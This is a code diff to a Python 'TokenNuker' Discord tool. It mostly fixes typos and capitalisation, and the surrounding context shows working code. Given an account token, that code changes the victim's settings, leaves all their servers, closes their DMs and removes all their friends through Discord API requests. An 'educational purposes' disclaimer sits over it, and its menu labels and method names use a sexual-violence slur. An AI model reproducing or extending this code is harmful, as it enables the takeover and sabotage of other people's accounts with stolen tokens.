@@ -1,4 +1,4 @@
-LICNECE = """
+LICENSE = """
 Copyright © 2021 Drillenissen#4268
 Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
 The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
@@ -35,8 +35,8 @@ class TokenNuker:
  ██{b}╔══{r2}██{b}║{r2}██{b}║╚{r2}██{b}╗{r2}██{b}║{r2}██{b}║   {r2}██{b}║{r2}██{b}║╚{r2}██{b}╗{r2}██{b}║{r2}██{b}║ {r2}██{b}╔{r2}██{b}╗{r2}
  ██{b}║  {r2}██{b}║{r2}██{b}║ ╚{r2}████{b}║╚{r2}██████{b}╔╝{r2}██{b}║ ╚{r2}████{b}║{r2}██{b}║{r2}██{b}╔╝ {r2}██{b}╗{r2}
  {b}╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝
-{r2} * DISCLAIMR: This script is made for           *
- * educational purporses and the developers     *
+{r2} * DISCLAIMER: This script is made for          *
+ * educational purposes and the developers      *
  * assume no liabilaty and are not responsible  *
  * for any misuse or damages caused by the      *
  * script                                       *
@@ -46,10 +46,10 @@ class TokenNuker:
             self.options = [
                 ("Nuke it!", self.nuke),
                 ("Flashbang!", self.flashBang),
-                ("Rape settings", self.rapeSettings),
-                ("Leave servers", self.rapeServers),
-                ("Close Dms", self.rapeDms),
-                ("Remove friends", self.rapeRelations)
+                ("Rape Settings", self.rapeSettings),
+                ("Leave Servers", self.rapeServers),
+                ("Close DMs", self.rapeDms),
+                ("Remove Friends", self.rapeRelations)
             ]
 
             try:
@@ -114,7 +114,7 @@ class TokenNuker:
     def rapeSettings(self):
         payload = {"theme" : "light","locale" : "ja","message_display_compact" : True,"inline_embed_media" : False,"gif_auto_play" : False,"render_embeds" : False,"render_reactions" : False,"animate_emoji" : False,"convert_emoticons" : False,"enable_tts_command" : False,"explicit_content_filter" : 0,"status" : "invisible"}
 
-        print(f"\n {r}[{b}+{r}] Changeing settings")
+        print(f"\n {r}[{b}+{r}] Changing Settings")
         requests.patch(
             "https://canary.discordapp.com/api/v6/users/@me/settings",
             headers = self.headers,
@@ -122,14 +122,14 @@ class TokenNuker:
         )
 
     def rapeServers(self):
-        print(f"\n {r}[{b}+{r}] Detecting servers")
+        print(f"\n {r}[{b}+{r}] Detecting Servers")
     
         guilds = requests.get(
             "https://discord.com/api/v6/users/@me/guilds",
             headers = self.headers
         ).json()
 
-        print(f" {r}[{b}!{r}] {len(guilds)} servers found\n")
+        print(f" {r}[{b}!{r}] {len(guilds)} Servers Found\n")
 
         for i in guilds:
             try:
@@ -164,7 +164,7 @@ class TokenNuker:
             )
 
     def rapeRelations(self):
-        print(f"\n {r}[{b}+{r}] Detecting relationships")
+        print(f"\n {r}[{b}+{r}] Detecting Relationships")
     
         relations = requests.get(
             "https://discord.com/api/v8/users/@me/relationships",
@@ -173,7 +173,7 @@ class TokenNuker:
     
         relations = [i for i in relations if i["type"] != 0]
     
-        print(f" {r}[{w}!{r}] {len(relations)} relationships found@n")
+        print(f" {r}[{w}!{r}] {len(relations)} Relationships Found")
     
         for i in relations:
             print(f"  {r}[{b}!{r}] Removing {i['user']['username']} from relationships")
